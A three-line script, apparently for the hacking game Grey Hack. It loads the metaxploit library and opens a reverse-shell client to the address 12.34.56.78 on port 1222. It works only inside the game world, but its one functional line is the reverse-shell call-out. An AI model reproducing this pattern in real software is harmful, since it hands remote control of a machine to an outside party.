// Made by aldusbumdlebore
// 05 / 20 / 2024

mx = include_lib("/lib/metaxploit.so")
if not mx then exit("install metaxploit.so")
mx.rshell_client("12.34.56.78", 1222, "bumdlebore")
